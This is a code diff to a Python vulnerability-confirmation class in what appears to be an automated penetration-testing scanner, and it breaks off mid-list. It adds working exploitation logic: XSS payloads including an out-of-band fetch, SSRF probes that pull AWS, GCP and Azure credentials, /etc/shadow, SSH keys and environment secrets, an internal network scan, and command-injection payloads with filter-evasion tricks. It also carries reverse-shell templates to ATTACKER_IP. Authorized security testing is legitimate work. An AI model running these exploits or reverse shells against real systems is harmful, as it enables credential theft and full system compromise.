@@ -94,10 +94,12 @@ class VulnConfirmer:
             "xss_reflected": self._confirm_xss,
             "xss_stored": self._confirm_xss,
             "xss_dom": self._confirm_xss,
+            "xss": self._confirm_xss,
             "ssrf": self._confirm_ssrf,
             "ssti": self._confirm_ssti,
             "cmd_injection": self._confirm_cmd_injection,
             "rce": self._confirm_cmd_injection,
+            "sqli": self._confirm_sqli,
             "lfi": self._confirm_lfi,
             "path_traversal": self._confirm_lfi,
             "idor": self._confirm_idor,
@@ -155,10 +157,14 @@ class VulnConfirmer:
             vuln.response_data = response_data
 
             # Escalate severity if exploitation proved critical impact
-            if result.get("escalate_to"):
+            escalate_to = result.get("escalate_to")
+            # Also use _escalate_severity if extracted_data is available
+            if not escalate_to and result.get("extracted_data"):
+                escalate_to = self._escalate_severity(result["extracted_data"])
+            if escalate_to:
                 from app.models.vulnerability import Severity
                 sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH}
-                new_sev = sev_map.get(result["escalate_to"])
+                new_sev = sev_map.get(escalate_to)
                 if new_sev and new_sev != vuln.severity:
                     vuln.severity = new_sev
                     result["escalated"] = True
@@ -188,7 +194,15 @@ class VulnConfirmer:
     # XSS Confirmation
     # -----------------------------------------------------------------------
     async def _confirm_xss(self, vuln, base_url: str) -> dict:
-        """Confirm XSS by sending payload and verifying reflection in executable context."""
+        """Confirm XSS by sending payload and verifying reflection in executable context.
+
+        Improvements:
+        - Checks CSP headers that would block execution
+        - Tests attribute escape payloads for attribute-context XSS
+        - DOM XSS source-to-sink pattern matching in JS
+        - OOB callback verification via img/fetch
+        - Multiple confirmation payload strategies
+        """
         url = vuln.url
         payload = vuln.payload_used
         method = vuln.method or "GET"
@@ -196,12 +210,24 @@ class VulnConfirmer:
         if not url or not payload:
             return {"confirmed": False}
 
-        # Try multiple confirmation payloads
+        # Unique marker for OOB/DOM verification
+        import random
+        xss_marker = f"PHANTOM_XSS_{random.randint(10000, 99999)}"
+
+        # Try multiple confirmation payloads (with attribute escape and OOB)
         confirm_payloads = [
             payload,  # Original
-            f'<img src=x onerror="document.title=\'PHANTOM_XSS_CONFIRMED\'">',
+            f'<img src=x onerror="document.title=\'{xss_marker}\'">',
             '<svg/onload=alert`PHANTOM`>',
             '"><img src=x onerror=alert(document.domain)>',
+            # Attribute escape payloads
+            f'" onmouseover="alert(\'{xss_marker}\')" data-x="',
+            f"' onfocus='alert(`{xss_marker}`)' autofocus='",
+            f'" onload="fetch(\'https://phantom-oob.example.com/{xss_marker}\')" x="',
+            # Event handler without quotes
+            f'"><svg onload=alert({xss_marker})>',
+            # JavaScript protocol in href context
+            f'javascript:alert("{xss_marker}")',
         ]
 
         async with self.rate_limit:
@@ -225,12 +251,17 @@ class VulnConfirmer:
                                 resp = await client.get(test_url)
 
                             body = resp.text
+                            headers = resp.headers
+
                             # Check if payload is reflected in executable context
                             if test_payload in body:
                                 # Verify it's NOT inside a comment, textarea, or escaped
                                 context = self._xss_context_check(test_payload, body)
                                 if context["executable"]:
-                                    return {
+                                    # Check CSP headers
+                                    csp_blocks = self._check_csp_blocks_xss(headers)
+
+                                    result = {
                                         "confirmed": True,
                                         "method": f"Payload reflected in {context['context']}",
                                         "proof": f"Payload '{test_payload[:80]}' reflected unescaped in HTTP response ({context['context']})",
@@ -243,10 +274,160 @@ class VulnConfirmer:
                                         "title_detail": f"Reflected in {context['context']}",
                                         "impact_addition": f"XSS payload `{test_payload[:80]}` was reflected unescaped in the response body within {context['context']} context. This allows arbitrary JavaScript execution in victim's browser.",
                                     }
+
+                                    if csp_blocks:
+                                        result["extracted_data"]["csp_note"] = csp_blocks
+                                        result["impact_addition"] += f"\n\nNote: CSP may restrict exploitation: {csp_blocks}"
+                                    else:
+                                        result["extracted_data"]["csp_note"] = "No restrictive CSP — full exploitation possible"
+
+                                    return result
                         except Exception:
                             continue
+
+                    # DOM XSS detection: check for source-to-sink patterns in JavaScript
+                    try:
+                        dom_result = await self._check_dom_xss(client, url, vuln.parameter)
+                        if dom_result.get("confirmed"):
+                            return dom_result
+                    except Exception:
+                        pass
+
             except Exception:
                 pass
+
+        return {"confirmed": False}
+
+    def _check_csp_blocks_xss(self, headers) -> str | None:
+        """Check if Content-Security-Policy blocks inline script execution."""
+        csp = headers.get("content-security-policy", "")
+        if not csp:
+            return None
+
+        blocks = []
+        csp_lower = csp.lower()
+
+        # Check script-src
+        if "script-src" in csp_lower:
+            if "'none'" in csp_lower:
+                blocks.append("script-src 'none' blocks all scripts")
+            elif "'self'" in csp_lower and "'unsafe-inline'" not in csp_lower:
+                blocks.append("script-src restricts to 'self' without 'unsafe-inline'")
+            elif "'nonce-" in csp_lower or "'strict-dynamic'" in csp_lower:
+                blocks.append("script-src uses nonce/strict-dynamic")
+
+        # Check default-src as fallback
+        if not blocks and "default-src" in csp_lower:
+            if "'none'" in csp_lower:
+                blocks.append("default-src 'none' blocks scripts")
+            elif "'self'" in csp_lower and "'unsafe-inline'" not in csp_lower:
+                blocks.append("default-src restricts inline scripts")
+
+        return "; ".join(blocks) if blocks else None
+
+    async def _check_dom_xss(self, client, url: str, param: str | None) -> dict:
+        """Check for DOM-based XSS by analyzing JavaScript source-to-sink patterns."""
+        try:
+            resp = await client.get(url)
+            body = resp.text
+
+            # Extract inline scripts
+            scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
+            js_content = "\n".join(scripts)
+
+            # Also check for JS file references and fetch them
+            js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', body, re.IGNORECASE)
+            parsed = urlparse(url)
+            for js_file in js_files[:3]:  # Limit to 3 JS files
+                if js_file.startswith("//"):
+                    js_url = f"{parsed.scheme}:{js_file}"
+                elif js_file.startswith("/"):
+                    js_url = f"{parsed.scheme}://{parsed.netloc}{js_file}"
+                elif js_file.startswith("http"):
+                    js_url = js_file
+                else:
+                    js_url = f"{parsed.scheme}://{parsed.netloc}/{js_file}"
+                try:
+                    js_resp = await client.get(js_url)
+                    if js_resp.status_code == 200:
+                        js_content += "\n" + js_resp.text[:50000]  # Limit size
+                except Exception:
+                    continue
+
+            if not js_content:
+                return {"confirmed": False}
+
+            # DOM XSS sources
+            sources = [
+                r"document\.location", r"document\.URL", r"document\.documentURI",
+                r"document\.referrer", r"window\.location", r"location\.hash",
+                r"location\.search", r"location\.href", r"document\.cookie",
+                r"window\.name", r"postMessage",
+            ]
+            # DOM XSS sinks
+            sinks = [
+                r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write\s*\(",
+                r"document\.writeln\s*\(", r"eval\s*\(", r"setTimeout\s*\(",
+                r"setInterval\s*\(", r"Function\s*\(", r"\.src\s*=",
+                r"\.href\s*=", r"\.action\s*=", r"jQuery\s*\(", r"\$\s*\(",
+            ]
+
+            found_sources = []
+            found_sinks = []
+            for src in sources:
+                if re.search(src, js_content):
+                    found_sources.append(src.replace("\\", ""))
+            for sink in sinks:
+                if re.search(sink, js_content):
+                    found_sinks.append(sink.replace("\\", ""))
+
+            # Check for direct source-to-sink flow patterns
+            dangerous_patterns = [
+                r"\.innerHTML\s*=\s*.*(?:location|document\.URL|document\.referrer|window\.name)",
+                r"document\.write\s*\(.*(?:location|document\.URL|document\.referrer)",
+                r"eval\s*\(.*(?:location|document\.URL|decodeURI)",
+                r"\$\s*\(.*(?:location\.hash|location\.search)",
+                r"jQuery\s*\(.*(?:location\.hash|location\.search)",
+            ]
+
+            direct_flows = []
+            for pat in dangerous_patterns:
+                matches = re.findall(pat, js_content[:100000])
+                if matches:
+                    direct_flows.extend(matches[:2])
+
+            if direct_flows:
+                return {
+                    "confirmed": True,
+                    "method": "DOM XSS: source-to-sink flow detected",
+                    "proof": f"JavaScript contains direct data flow from user-controlled source to dangerous sink",
+                    "extracted_data": {
+                        "sources": found_sources[:5],
+                        "sinks": found_sinks[:5],
+                        "dangerous_flows": [f[:200] for f in direct_flows[:3]],
+                    },
+                    "depth": "dom_xss",
+                    "escalate_to": "high",
+                    "title_detail": "DOM XSS Source-to-Sink Flow",
+                    "impact_addition": f"DOM XSS detected: JavaScript contains direct data flow from user input sources ({', '.join(found_sources[:3])}) to dangerous sinks ({', '.join(found_sinks[:3])}). Exploitation possible via crafted URL.",
+                }
+            elif found_sources and found_sinks:
+                # Sources and sinks exist but no direct flow proven
+                return {
+                    "confirmed": True,
+                    "method": "DOM XSS: sources and sinks present",
+                    "proof": f"JavaScript uses {len(found_sources)} user-controlled sources and {len(found_sinks)} dangerous sinks",
+                    "extracted_data": {
+                        "sources": found_sources[:5],
+                        "sinks": found_sinks[:5],
+                    },
+                    "depth": "dom_xss_potential",
+                    "title_detail": "Potential DOM XSS",
+                    "impact_addition": f"Potential DOM XSS: {len(found_sources)} sources and {len(found_sinks)} sinks detected in JavaScript. Manual verification recommended.",
+                }
+
+        except Exception:
+            pass
 
         return {"confirmed": False}
 
@@ -281,6 +462,25 @@ class VulnConfirmer:
         if html.escape(payload) in body and payload not in body:
             return {"executable": False, "context": "html_encoded", "snippet": snippet}
 
+        # Check if inside an attribute with encoding (e.g., value="&lt;script&gt;")
+        # Look for the attribute context around the payload
+        attr_before = body[max(0, idx - 100):idx]
+        if re.search(r'=\s*["\'][^"\']*$', attr_before):
+            # We're inside an attribute value
+            # Check if the attribute value has HTML encoding
+            attr_match = re.search(r'(\w+)\s*=\s*["\']([^"\']*?)$', attr_before)
+            if attr_match:
+                attr_name = attr_match.group(1).lower()
+                # Event handler attributes are executable
+                if attr_name.startswith("on"):
+                    return {"executable": True, "context": f"event_handler_{attr_name}", "snippet": snippet}
+                # href with javascript: is executable
+                if attr_name in ("href", "src", "action") and "javascript:" in payload.lower():
+                    return {"executable": True, "context": f"js_protocol_in_{attr_name}", "snippet": snippet}
+                # data-* and non-executable attributes are safe
+                if attr_name in ("value", "placeholder", "title", "alt", "data"):
+                    return {"executable": False, "context": f"safe_attribute_{attr_name}", "snippet": snippet}
+
         # Check for script/event handler context
         if "<script" in payload.lower() or "onerror" in payload.lower() or "onload" in payload.lower():
             return {"executable": True, "context": "html_body_with_handler", "snippet": snippet}
@@ -296,7 +496,14 @@ class VulnConfirmer:
     # SSRF Confirmation
     # -----------------------------------------------------------------------
     async def _confirm_ssrf(self, vuln, base_url: str) -> dict:
-        """Confirm SSRF by reading internal resources / cloud metadata."""
+        """Confirm SSRF by reading internal resources / cloud metadata.
+
+        Improvements:
+        - AWS credential chain: get role name -> get full creds
+        - Internal service data extraction
+        - Internal IP range scanning via SSRF
+        - Severity escalation based on what was accessed
+        """
         url = vuln.url
         method = vuln.method or "GET"
         param = vuln.parameter
@@ -309,48 +516,174 @@ class VulnConfirmer:
             ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
             ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
             ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP metadata"),
+            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP service account token"),
             ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
+            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed identity token"),
             ("http://127.0.0.1:6379/INFO", "Local Redis"),
+            ("http://127.0.0.1:27017/", "Local MongoDB"),
+            ("http://127.0.0.1:9200/_cluster/health", "Local Elasticsearch"),
+            ("http://127.0.0.1:5984/_all_dbs", "Local CouchDB"),
+            ("http://127.0.0.1:8500/v1/agent/members", "Local Consul"),
             ("file:///etc/passwd", "Local file read"),
+            ("file:///etc/shadow", "Shadow file read"),
             ("file:///etc/hostname", "Hostname read"),
+            ("file:///proc/self/environ", "Process environment"),
+            ("file:///root/.ssh/id_rsa", "SSH private key"),
+            ("file:///home/ubuntu/.aws/credentials", "AWS credential file"),
             ("http://127.0.0.1:80/", "Localhost HTTP"),
+            ("http://127.0.0.1:8080/", "Localhost 8080"),
+            ("http://127.0.0.1:3000/", "Localhost 3000"),
         ]
+
+        all_extracted = {}
+        best_result = None
+        best_severity = None
 
         async with self.rate_limit:
             try:
                 async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                     for target_url, desc in ssrf_targets:
                         try:
-                            if method.upper() == "POST":
-                                resp = await client.post(url, data={param: target_url})
-                            else:
-                                parsed = urlparse(url)
-                                params = parse_qs(parsed.query, keep_blank_values=True)
-                                params[param] = [target_url]
-                                new_query = urlencode(params, doseq=True)
-                                test_url = urlunparse(parsed._replace(query=new_query))
-                                resp = await client.get(test_url)
+                            resp = await self._ssrf_send(client, url, param, method, target_url)
+                            if resp is None:
+                                continue
 
                             body = resp.text
                             extracted = self._analyze_ssrf_response(body, desc)
                             if extracted:
-                                escalate = "critical" if "credential" in desc.lower() or "iam" in desc.lower() else None
-                                return {
-                                    "confirmed": True,
-                                    "method": f"SSRF to {desc}",
-                                    "proof": f"Server fetched {target_url} and returned internal data",
-                                    "extracted_data": extracted,
-                                    "depth": "data_extraction",
-                                    "escalate_to": escalate,
-                                    "title_detail": f"Read {desc}",
-                                    "impact_addition": f"SSRF confirmed: server-side request to `{target_url}` returned internal data:\n```\n{json.dumps(extracted, indent=2)[:500]}\n```",
-                                }
+                                all_extracted.update(extracted)
+
+                                # Determine severity based on what was accessed
+                                severity = self._ssrf_severity(extracted, desc)
+                                if best_severity is None or self._sev_rank(severity) > self._sev_rank(best_severity):
+                                    best_severity = severity
+                                    best_result = {
+                                        "confirmed": True,
+                                        "method": f"SSRF to {desc}",
+                                        "proof": f"Server fetched {target_url} and returned internal data",
+                                        "extracted_data": dict(all_extracted),
+                                        "depth": "data_extraction",
+                                        "escalate_to": severity,
+                                        "title_detail": f"Read {desc}",
+                                        "impact_addition": f"SSRF confirmed: server-side request to `{target_url}` returned internal data:\n```\n{json.dumps(extracted, indent=2)[:500]}\n```",
+                                    }
+
+                                # AWS credential chain: if we found IAM role list, get full creds
+                                if "iam" in desc.lower() and body.strip() and "AccessKeyId" not in body:
+                                    role_name = body.strip().split("\n")[0].strip()
+                                    if role_name and not role_name.startswith("<"):
+                                        creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+                                        creds_resp = await self._ssrf_send(client, url, param, method, creds_url)
+                                        if creds_resp:
+                                            creds_body = creds_resp.text
+                                            creds_extracted = self._analyze_ssrf_response(creds_body, "AWS IAM full credentials")
+                                            if creds_extracted:
+                                                all_extracted.update(creds_extracted)
+                                                all_extracted["iam_role"] = role_name
+                                                best_severity = "critical"
+                                                best_result = {
+                                                    "confirmed": True,
+                                                    "method": f"SSRF → AWS IAM credential extraction (role: {role_name})",
+                                                    "proof": f"Chained SSRF: discovered IAM role '{role_name}' and extracted full credentials",
+                                                    "extracted_data": dict(all_extracted),
+                                                    "depth": "credential_extraction",
+                                                    "escalate_to": "critical",
+                                                    "title_detail": f"AWS IAM Credentials Stolen (role: {role_name})",
+                                                    "impact_addition": f"Critical SSRF chain: discovered IAM role `{role_name}` and extracted AWS credentials. Full AWS account compromise possible.",
+                                                }
+
                         except Exception:
                             continue
+
+                    # Internal IP range scan via SSRF (quick scan of common internal IPs)
+                    if best_result:
+                        internal_scan = await self._ssrf_internal_scan(client, url, param, method)
+                        if internal_scan:
+                            all_extracted["internal_services"] = internal_scan
+                            best_result["extracted_data"] = dict(all_extracted)
+                            best_result["impact_addition"] += f"\n\nInternal network scan: {len(internal_scan)} reachable services found."
+
             except Exception:
                 pass
 
-        return {"confirmed": False}
+        return best_result if best_result else {"confirmed": False}
+
+    async def _ssrf_send(self, client, url, param, method, target_url) -> httpx.Response | None:
+        """Send an SSRF request via the vulnerable parameter."""
+        try:
+            if method.upper() == "POST":
+                resp = await client.post(url, data={param: target_url})
+            else:
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                params[param] = [target_url]
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse(parsed._replace(query=new_query))
+                resp = await client.get(test_url)
+            return resp
+        except Exception:
+            return None
+
+    async def _ssrf_internal_scan(self, client, url, param, method) -> list[dict]:
+        """Quick scan of common internal services via SSRF."""
+        services = []
+        scan_targets = [
+            ("http://10.0.0.1/", "Internal gateway 10.0.0.1"),
+            ("http://172.17.0.1/", "Docker gateway"),
+            ("http://192.168.1.1/", "Internal gateway 192.168.1.1"),
+            ("http://127.0.0.1:8080/", "Local Tomcat/App"),
+            ("http://127.0.0.1:9090/", "Local Prometheus"),
+            ("http://127.0.0.1:3306/", "Local MySQL"),
+            ("http://127.0.0.1:5432/", "Local PostgreSQL"),
+            ("http://kubernetes.default.svc/", "Kubernetes API"),
+        ]
+
+        for target_url, desc in scan_targets:
+            try:
+                resp = await self._ssrf_send(client, url, param, method, target_url)
+                if resp and resp.status_code == 200 and len(resp.text) > 10:
+                    services.append({
+                        "url": target_url,
+                        "description": desc,
+                        "status": resp.status_code,
+                        "content_length": len(resp.text),
+                        "snippet": resp.text[:100],
+                    })
+            except Exception:
+                continue
+
+        return services
+
+    def _ssrf_severity(self, extracted: dict, desc: str) -> str:
+        """Determine severity based on SSRF extraction results."""
+        # Credentials found = critical
+        if extracted.get("iam_leak") or extracted.get("AccessKeyId"):
+            return "critical"
+        if extracted.get("service_account_token"):
+            return "critical"
+        if any(k in extracted for k in ["ssh_key", "aws_creds_file"]):
+            return "critical"
+        # Shadow file or SSH keys = critical
+        if "shadow" in desc.lower() or "private key" in desc.lower() or "credential file" in desc.lower():
+            return "critical"
+        # Cloud metadata = critical (can lead to creds)
+        if "metadata" in desc.lower() or "iam" in desc.lower():
+            return "critical"
+        # File read = high
+        if extracted.get("file_read") or "file" in desc.lower():
+            return "high"
+        # Internal service access = high
+        if extracted.get("service"):
+            return "high"
+        # Process environment = critical (often contains secrets)
+        if "environ" in desc.lower():
+            return "critical"
+        return "high"
+
+    @staticmethod
+    def _sev_rank(severity: str | None) -> int:
+        """Numeric rank for severity comparison."""
+        return {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}.get(severity or "", -1)
 
     def _analyze_ssrf_response(self, body: str, desc: str) -> dict | None:
         """Extract meaningful data from SSRF response."""
@@ -368,7 +701,7 @@ class VulnConfirmer:
         if "AccessKeyId" in body:
             data["cloud"] = "AWS"
             data["iam_leak"] = True
-            for field in ["AccessKeyId", "SecretAccessKey", "Token"]:
+            for field in ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"]:
                 match = re.search(rf'"{field}"\s*:\s*"([^"]+)"', body)
                 if match:
                     data[field] = match.group(1)[:20] + "..." if len(match.group(1)) > 20 else match.group(1)
@@ -378,11 +711,55 @@ class VulnConfirmer:
             data["cloud"] = "GCP"
             data["metadata_content"] = body[:300]
 
+        # GCP service account token
+        if "access_token" in body and "token_type" in body:
+            data["cloud"] = data.get("cloud", "GCP")
+            data["service_account_token"] = True
+            match = re.search(r'"access_token"\s*:\s*"([^"]+)"', body)
+            if match:
+                data["access_token"] = match.group(1)[:20] + "..."
+
+        # Azure managed identity token
+        if "access_token" in body and "azure" in desc.lower():
+            data["cloud"] = "Azure"
+            data["managed_identity_token"] = True
+            match = re.search(r'"access_token"\s*:\s*"([^"]+)"', body)
+            if match:
+                data["azure_token"] = match.group(1)[:20] + "..."
+
         # /etc/passwd
         if "root:x:" in body:
             data["file_read"] = "/etc/passwd"
             users = re.findall(r"^([^:]+):x:(\d+):", body, re.MULTILINE)
             data["users"] = [{"name": u[0], "uid": u[1]} for u in users[:10]]
+
+        # /etc/shadow
+        if re.search(r"root:\$\d\$", body):
+            data["file_read"] = "/etc/shadow"
+            data["shadow_hashes"] = True
+
+        # Process environment
+        if "PATH=" in body and "\x00" in body:
+            data["file_read"] = "/proc/self/environ"
+            env_pairs = re.findall(r"([A-Z_]+)=([^\x00]+?)(?:\x00|$)", body)
+            data["environment"] = {k: v[:50] for k, v in env_pairs[:15]}
+            # Check for secrets in env
+            for k, v in env_pairs:
+                if any(s in k.upper() for s in ["SECRET", "KEY", "PASSWORD", "TOKEN", "API"]):
+                    data["env_secrets"] = data.get("env_secrets", {})
+                    data["env_secrets"][k] = v[:30] + "..."
+
+        # SSH private key
+        if "BEGIN" in body and "PRIVATE KEY" in body:
+            data["ssh_key"] = True
+            data["file_read"] = desc
+
+        # AWS credential file
+        if "aws_access_key_id" in body.lower():
+            data["aws_creds_file"] = True
+            match = re.search(r"aws_access_key_id\s*=\s*(\S+)", body, re.I)
+            if match:
+                data["aws_key"] = match.group(1)[:10] + "..."
 
         # Redis
         if "redis_version" in body:
@@ -390,6 +767,31 @@ class VulnConfirmer:
             match = re.search(r"redis_version:(\S+)", body)
             if match:
                 data["redis_version"] = match.group(1)
+
+        # Elasticsearch
+        if "cluster_name" in body or "cluster_uuid" in body:
+            data["service"] = "elasticsearch"
+            try:
+                es_data = json.loads(body)
+                data["es_cluster"] = es_data.get("cluster_name", "")
+                data["es_status"] = es_data.get("status", "")
+            except Exception:
+                data["es_info"] = body[:200]
+
+        # MongoDB
+        if "ismaster" in body.lower() or "mongodb" in body.lower():
+            data["service"] = "mongodb"
+            data["mongo_info"] = body[:200]
+
+        # Consul
+        if "Member" in body and "Tags" in body:
+            data["service"] = "consul"
+            data["consul_info"] = body[:300]
+
+        # Kubernetes
+        if "kubernetes" in body.lower() or "apiVersion" in body:
+            data["service"] = "kubernetes"
+            data["k8s_info"] = body[:300]
 
         return data if data else None
 
@@ -488,7 +890,14 @@ class VulnConfirmer:
     # Command Injection Confirmation
     # -----------------------------------------------------------------------
     async def _confirm_cmd_injection(self, vuln, base_url: str) -> dict:
-        """Confirm command injection by executing unique commands."""
+        """Confirm command injection by executing unique commands.
+
+        Improvements:
+        - Chain exploitation: after confirming `id`, try `cat /etc/passwd`
+        - Test file write capability
+        - Report potential reverse shell capability
+        - Extract maximum system information
+        """
         url = vuln.url
         param = vuln.parameter
         method = vuln.method or "GET"
@@ -497,36 +906,39 @@ class VulnConfirmer:
             return {"confirmed": False}
 
         # Use unique markers to avoid false positives
-        marker = "PHANTOM_CMD_7x3k9"
+        import random
+        marker = f"PHANTOM_CMD_{random.randint(10000, 99999)}"
         cmd_probes = [
             # Echo with unique marker
             (f"; echo {marker}", marker, "semicolon echo"),
             (f"| echo {marker}", marker, "pipe echo"),
             (f"` echo {marker}`", marker, "backtick echo"),
             (f"$(echo {marker})", marker, "subshell echo"),
+            # IFS bypass (WAF evasion)
+            (f";echo${{IFS}}{marker}", marker, "IFS bypass echo"),
+            (f";echo%09{marker}", marker, "tab bypass echo"),
             # System info extraction
             ("; id", "uid=", "id command"),
             ("| cat /etc/hostname", "", "hostname read"),
             ("; uname -a", "Linux", "uname command"),
+            # Newline bypass
+            (f"%0aid", "uid=", "newline bypass id"),
             # Windows variants
             ("& echo %USERNAME%", "", "Windows echo"),
             ("| type C:\\Windows\\win.ini", "[fonts]", "Windows file read"),
+            ("& whoami", "\\", "Windows whoami"),
         ]
+
+        initial_confirmed = None
 
         async with self.rate_limit:
             try:
                 async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                     for payload, expected, desc in cmd_probes:
                         try:
-                            if method.upper() == "POST":
-                                resp = await client.post(url, data={param: payload})
-                            else:
-                                parsed = urlparse(url)
-                                params = parse_qs(parsed.query, keep_blank_values=True)
-                                params[param] = [payload]
-                                new_query = urlencode(params, doseq=True)
-                                test_url = urlunparse(parsed._replace(query=new_query))
-                                resp = await client.get(test_url)
+                            resp = await self._cmd_send(client, url, param, method, payload)
+                            if resp is None:
+                                continue
 
                             body = resp.text
 
@@ -547,22 +959,125 @@ class VulnConfirmer:
                                     if uname_match:
                                         extracted["kernel"] = uname_match.group(0)[:100]
 
-                                return {
-                                    "confirmed": True,
+                                initial_confirmed = {
                                     "method": desc,
-                                    "proof": f"Command `{payload}` executed, output `{expected}` found in response",
-                                    "extracted_data": extracted or {"marker_found": expected, "payload": payload},
-                                    "depth": "command_execution",
-                                    "escalate_to": "critical",
-                                    "title_detail": f"RCE via {desc}",
-                                    "impact_addition": f"Command injection confirmed: `{payload}` resulted in `{expected}` in response. Full remote code execution is possible.",
+                                    "payload_prefix": payload[:2],  # ; | ` $
+                                    "extracted": extracted,
                                 }
+                                break
                         except Exception:
                             continue
+
+                    if not initial_confirmed:
+                        return {"confirmed": False}
+
+                    # --- Chain exploitation: extract more data ---
+                    extracted = dict(initial_confirmed["extracted"])
+                    prefix = initial_confirmed["payload_prefix"]
+                    chain_cmds = [
+                        (f"{prefix} cat /etc/passwd", "passwd file"),
+                        (f"{prefix} whoami", "current user"),
+                        (f"{prefix} cat /etc/hostname", "hostname"),
+                        (f"{prefix} ls -la /", "root listing"),
+                        (f"{prefix} env | head -20", "environment"),
+                    ]
+
+                    for chain_payload, chain_desc in chain_cmds:
+                        try:
+                            resp = await self._cmd_send(client, url, param, method, chain_payload)
+                            if resp is None:
+                                continue
+                            body = resp.text
+
+                            if "root:x:" in body:
+                                users = re.findall(r"^([^:]+):x:(\d+):", body, re.MULTILINE)
+                                extracted["passwd_users"] = [u[0] for u in users[:10]]
+                                extracted["passwd_read"] = True
+                            elif chain_desc == "current user":
+                                # Extract whoami output
+                                clean = body.strip()
+                                if clean and len(clean) < 100:
+                                    extracted["whoami"] = clean[:50]
+                            elif chain_desc == "hostname":
+                                clean = body.strip()
+                                if clean and len(clean) < 100:
+                                    extracted["hostname"] = clean[:50]
+                            elif "PATH=" in body or "HOME=" in body:
+                                env_pairs = re.findall(r"([A-Z_]+)=(.+)", body)
+                                extracted["env_vars"] = {k: v[:50] for k, v in env_pairs[:10]}
+                        except Exception:
+                            continue
+
+                    # --- Test file write capability ---
+                    write_marker = f"phantom_write_test_{random.randint(10000, 99999)}"
+                    write_payload = f"{prefix} echo {write_marker} > /tmp/phantom_test"
+                    can_write = False
+                    try:
+                        resp = await self._cmd_send(client, url, param, method, write_payload)
+                        if resp is not None:
+                            # Verify by reading it back
+                            read_payload = f"{prefix} cat /tmp/phantom_test"
+                            read_resp = await self._cmd_send(client, url, param, method, read_payload)
+                            if read_resp and write_marker in read_resp.text:
+                                can_write = True
+                                extracted["file_write"] = True
+                                # Clean up
+                                await self._cmd_send(client, url, param, method, f"{prefix} rm /tmp/phantom_test")
+                    except Exception:
+                        pass
+
+                    # --- Report reverse shell possibility (DO NOT execute) ---
+                    reverse_shells = []
+                    if extracted.get("user") or extracted.get("whoami"):
+                        reverse_shells = [
+                            "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+                            "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+                            "nc -e /bin/sh ATTACKER_IP 4444",
+                        ]
+
+                    impact_parts = [
+                        f"Command injection confirmed via `{initial_confirmed['method']}`. Full remote code execution is possible.",
+                    ]
+                    if extracted.get("passwd_read"):
+                        impact_parts.append(f"Read /etc/passwd: {len(extracted.get('passwd_users', []))} users found.")
+                    if can_write:
+                        impact_parts.append("File write confirmed (can write to /tmp).")
+                    if reverse_shells:
+                        impact_parts.append(f"Reverse shell payloads available ({len(reverse_shells)} variants).")
+
+                    return {
+                        "confirmed": True,
+                        "method": initial_confirmed["method"],
+                        "proof": f"Command execution confirmed, chained to extract system info",
+                        "extracted_data": {
+                            **extracted,
+                            "can_write_files": can_write,
+                            "reverse_shell_templates": reverse_shells[:2] if reverse_shells else [],
+                        },
+                        "depth": "full_rce",
+                        "escalate_to": "critical",
+                        "title_detail": f"Full RCE via {initial_confirmed['method']}" + (" + File Write" if can_write else ""),
+                        "impact_addition": "\n".join(impact_parts),
+                    }
             except Exception:
                 pass
 
         return {"confirmed": False}
+
+    async def _cmd_send(self, client, url, param, method, payload) -> httpx.Response | None:
+        """Send a command injection payload."""
+        try:
+            if method.upper() == "POST":
+                return await client.post(url, data={param: payload})
+            else:
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                params[param] = [payload]
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse(parsed._replace(query=new_query))
+                return await client.get(test_url)
+        except Exception:
+            return None
 
     # -----------------------------------------------------------------------
     # LFI / Path Traversal Confirmation
@@ -781,7 +1296,14 @@ class VulnConfirmer:
     # Auth Bypass Confirmation
     # -----------------------------------------------------------------------
     async def _confirm_auth_bypass(self, vuln, base_url: str) -> dict:
-        """Confirm auth bypass by accessing protected resources."""
+        """Confirm auth bypass by accessing protected resources.
+
+        Improvements:
+        - Scope bypass: access /api/users/OTHER_ID without auth (IDOR+auth_bypass)
+        - Method bypass: if GET blocked, try POST/PUT/PATCH/OPTIONS
+        - Header bypass: X-Forwarded-For, X-Original-URL, X-Rewrite-URL
+        - Path traversal bypass: /admin → blocked, /admin/ → allowed, /Admin, /%61dmin
+        """
         url = vuln.url
         if not url:
             return {"confirmed": False}
@@ -790,14 +1312,18 @@ class VulnConfirmer:
         protected_paths = [
             "/admin", "/admin/dashboard", "/api/admin/users",
             "/api/users", "/dashboard", "/settings",
-            "/api/v1/users", "/manage",
+            "/api/v1/users", "/manage", "/api/admin",
+            "/internal", "/api/internal",
         ]
 
         accessed = []
+        bypass_methods_used = []
+
         async with self.rate_limit:
             try:
                 # Use a client WITHOUT auth cookies
                 async with make_client(timeout=10.0) as client:
+                    # --- Strategy 1: Direct unauthenticated access ---
                     for path in protected_paths:
                         test_url = f"{base_url}{path}"
                         try:
@@ -811,22 +1337,166 @@ class VulnConfirmer:
                                     "url": test_url,
                                     "status": resp.status_code,
                                     "content_length": len(resp.text),
+                                    "bypass": "direct_access",
                                 })
+                                bypass_methods_used.append("direct_access")
                         except Exception:
                             continue
+
+                    # --- Strategy 2: Path traversal bypass variants ---
+                    path_bypass_variants = [
